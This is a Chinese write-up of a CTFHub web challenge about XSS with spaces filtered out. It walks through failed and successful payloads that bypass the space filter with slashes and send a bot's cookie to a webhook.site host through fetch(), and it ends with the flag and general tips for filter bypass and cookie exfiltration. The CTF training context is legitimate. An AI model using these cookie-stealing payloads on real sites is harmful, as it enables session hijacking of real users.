【CTFHub】Web-XSS过滤空格 Writeup

操作者：何芊宏 | 操作日期：2026.9.23 | 分类：CTF | 标签：CTFHub, Web, XSS, 空格过滤, Webhook, OOB

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / 过滤空格
  • 题目名称：过滤空格
  • 提示：页面提供修改名称的功能，后端会过滤输入中的所有空格字符。目标是在无空格条件下构造有效的Payload，使Bot端执行并外带Cookie。

2. 解题思路与知识点

空格过滤的绕过原理：在HTML和JavaScript中，空格起着分隔作用。我们可以利用斜杠 / 替代HTML标签属性间的空格，利用单单词函数（如 fetch）替代带空格的函数（如 new Image()），从而在无空格的环境下维持代码的语法正确性。

Bot端执行环境限制（核心难点）：机器人（Bot）通常在无头浏览器中运行，带有严格的防御策略（如内容安全策略 CSP）和特定的行为检测。它可能会拦截跨域请求、阻止页面发生非预期的重定向跳转，或因为JavaScript的细微语法错误而直接中断执行。

颜色对应规则说明：

  • 红色：靶场造成的过滤或Bot端环境触发的拦截与语法崩溃。
  • 橙色：Payload中导致Bot端执行失败的错误写法。
  • 绿色：最终成功绕过限制、完美适配Bot端的Payload写法。

3. 操作步骤（含试错过程）

第一步：探测与验证漏洞

在输入框输入标准Payload验证过滤机制：

<img src=x onerror=alert(1)>

提交后无反应。按F12查看网页源码，发现空格被直接删除，标签变成了 <imgsrc=xonerror=alert(1)>。

第二步：尝试使用斜杠替代HTML空格（Bot端执行失败）

使用斜杠 / 替代HTML空格，构造外带Payload：

<img/src=x/onerror="new Image().src='https://webhook.site/.../?c='+document.cookie">

提交后网页出现破图图标（onerror触发），将此URL发送给Bot提示 Successfully，但Webhook未收到请求。

原因分析：靶场不仅过滤HTML空格，也过滤了JavaScript内部的空格。Bot解析代码时，new Image() 被解析为 newImage()，触发语法错误（SyntaxError），导致代码中断，未能执行网络请求。

第三步：尝试 location 跳转外带（Bot端执行失败）

使用 location.href 替代 new Image() 以规避内部空格：

<img/src=x/onerror=location.href='//webhook.site/.../?c='+document.cookie>

发送给Bot后，Webhook依旧无记录。

原因分析：无头浏览器通常具有严格的安全策略。使用 location.href 会迫使 Bot 发生页面跳转，这种行为往往会被 Bot 拦截，或者导致 Bot 的执行上下文被销毁，请求未能发出。

第四步：尝试无引号编码外带（Bot端执行失败）

尝试使用 String.fromCharCode 编码规避所有引号与空格：

<img/src=x/onerror=fetch(String.fromCharCode(104,116,116,112,115,58,47...)+document.cookie)>

Bot端执行后，Webhook依然无记录。

原因分析：虽然这段代码语法正确，但庞大复杂的编码可能导致Bot端浏览器请求被CSP（内容安全策略）拦截，或者代码在Bot特定的沙盒环境中被解析器丢弃。

第五步：使用静默精简Payload（成功）

改用单单词函数 fetch 避免内部空格，使用 // 和 c= 简化参数，构造最终Payload：

<svg/onload="fetch('//webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?c='+document.cookie)">

此Payload使用了斜杠代替HTML空格，fetch函数避免JS内部空格，// 和 c=极大精简了URL长度。

提交后发送给Bot，Webhook成功收到带有Flag的请求：

ctfhub{f9688a80448a38a07e2e0c05}

提交至CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：HTML标签属性空格被过滤。导致 <img src=x> 变成 <imgsrc=x>，无法解析。解决办法是使用斜杠 / 替代。
  • 坑2：JavaScript语法内部空格被过滤。导致 new Image() 变成 newImage()，触发JS语法错误。解决办法是使用单单词函数 fetch()。
  • 坑3：Bot端对跳转行为的拦截。使用 location.href 会导致页面跳转，被Bot的安全策略拦截，或因为跳转丢失执行上下文而失败。应使用 fetch 进行静默请求。
  • 坑4：Bot端对复杂/跨域请求的拦截。复杂的Payload（如编码混淆）或触发跨域请求时，可能被Bot的CSP策略阻止。应使用精简、标准的语法。

5. 知识总结

  • 空格绕过手段：替代空格的常用符号包括斜杠 /、注释 /**/、换行符 %0a 和制表符 %09。
  • 适配Bot环境的外带技巧：优先使用静默请求函数 fetch()，尽量避免使用会引发页面跳转的 location.href。
  • 精简与去混淆：使用 //webhook.site 替代 https://webhook.site，使用 c= 替代 cookie=，精简的代码不仅便于阅读，更能减少在各个传输环节中被拦截的概率。
